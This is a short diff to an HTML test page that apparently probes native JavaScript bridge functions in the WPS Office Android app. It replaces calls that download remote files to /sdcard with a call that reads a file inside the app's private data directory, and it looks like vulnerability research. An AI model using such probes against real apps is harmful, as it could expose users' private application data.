@@ -146,12 +146,9 @@
             }
         }
 
-        function tryDownload4() {
+        function testGetFile() {
             try {
-                document.getElementById("myP").innerHTML = splash.JSDownload("random", "/sdcard/findMeNow.txt")
-                // document.getElementById("myP").innerHTML += splash.download("https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt","./")
-                // document.getElementById("myP").innerHTML += splash.download("/sdcard","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
-                // document.getElementById("myP").innerHTML += splash.download("./","https://raw.githubusercontent.com/robertprast/robertprast.github.io/master/test.txt")
+                document.getElementById("myP").innerHTML = getFileSize("file:///data/data/cn.wps.moffice_eng/shared_prefs/fileradar_record.xml")
             } catch (error) {
                 document.getElementById("myP").innerHTML = error;
             }
@@ -222,8 +219,8 @@
     </button>
 
     <br>
-    <button onclick="tryDownload4()">
-        Call download4 - Native Function
+    <button onclick="testGetFile()">
+        Call File - Native Function
 
     </button>
 
